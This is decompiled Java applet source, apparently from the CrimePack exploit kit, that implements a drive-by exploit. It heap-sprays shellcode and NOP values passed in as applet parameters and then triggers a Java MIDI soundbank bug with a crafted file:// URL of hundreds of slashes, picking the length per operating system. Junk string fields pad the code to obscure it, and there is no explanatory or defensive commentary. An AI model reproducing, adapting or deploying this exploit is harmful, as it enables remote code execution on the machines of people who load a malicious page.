import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.nio.IntBuffer;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class crimepack extends Applet
{
    String UBASITYBSDGSDgVASITYV;
    String SDGSD;
    String UBASITYBDGSDVgRWEWETASITYV;
    String UBASITYSDSGDBAFgASFAFVASITYV;
    String UBASIASFSFgASDGSDGSDGSFTYBVASITYV;
    private IntBuffer[] mem;
    
    public crimepack() {
        this.UBASITYBSDGSDgVASITYV = "AfSIBf";
        this.SDGSD = "GGWETWETWEGG";
        this.UBASITYBDGSDVgRWEWETASITYV = "SDsfSDFf";
        this.UBASITYSDSGDBAFgASFAFVASITYV = "ASsDGSDgEBf";
        this.UBASIASFSFgASDGSDGSDGSFTYBVASITYV = "ASSSDGSDGSDGDSIBf";
    }
    
    @Override
    public void init() {
        final String UBASITYASDFBVASITYV = "Gff";
        String s = "";
        s = repeat('/', 303);
        final String s2 = System.getProperty("os.name").toLowerCase();
        if (s2.indexOf("win") >= 0) {
            s = repeat('/', 302);
        }
        else if (s2.indexOf("mac") >= 0) {
            s = repeat('/', 1080);
        }
        else {
            if (s2.indexOf("nix") < 0 && s2.indexOf("nux") < 0) {
                return;
            }
            s = repeat('/', 1337);
        }
        s = "file://" + s + "Z%Z%Z%Z%Z%Z%";
        try {
            this.mem = this.spray(this.getParameter("sc"), this.getParameter("np"));
            MidiSystem.getSoundbank(new URL(s));
            while (true) {
                Thread.sleep(10L);
            }
        }
        catch (Exception exception) {
            System.out.println(exception);
            final String UBASITYBVASIWWWTYV = "AGff";
        }
    }
    
    public static String repeat(final char c, final int i) {
        final String UBASITYBAFASFVASITYV = "WEfERWER";
        String s = "";
        for (int j = 0; j < i; ++j) {
            s += c;
        }
        return s;
    }
    
    public static short[] HexDecode(final String s) {
        final short[] aword0 = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            final char c = s.charAt(i);
            final char c2 = s.charAt(i + 1);
            int j = Character.digit(c, 16) & 0xFF;
            j <<= 4;
            j += (Character.digit(c2, 16) & 0xFF);
            aword0[i / 2] = (short)j;
        }
        return aword0;
    }
    
    public final IntBuffer[] spray(final String s, final String s1) {
        final short[] aword0 = HexDecode(s);
        final short[] aword2 = HexDecode(s1);
        return this.spray(aword0, aword2);
    }
    
    public final IntBuffer[] spray(final short[] aword0, final short[] aword1) {
        final byte byte0 = 50;
        final int i = 1048576;
        final int j = i / 4 - aword0.length;
        final IntBuffer[] aintbuffer = new IntBuffer[byte0];
        for (int k = 0; k < byte0; ++k) {
            final IntBuffer intbuffer = IntBuffer.allocate(i / 4);
            for (int l = 0; l < j; ++l) {
                intbuffer.put(aword1[0] | aword1[1] << 8 | aword1[2] << 16 | aword1[3] << 24);
            }
            int i2 = 0;
            while (i2 < aword0.length) {
                intbuffer.put(aword0[i2++] | aword0[i2++] << 8 | aword0[i2++] << 16 | aword0[i2++] << 24);
            }
            aintbuffer[k] = intbuffer;
        }
        final String UBASIARARASRTSDgSDSDGYBVASITYV = "ASDSDGDFUIABFASIBf";
        return aintbuffer;
    }
}
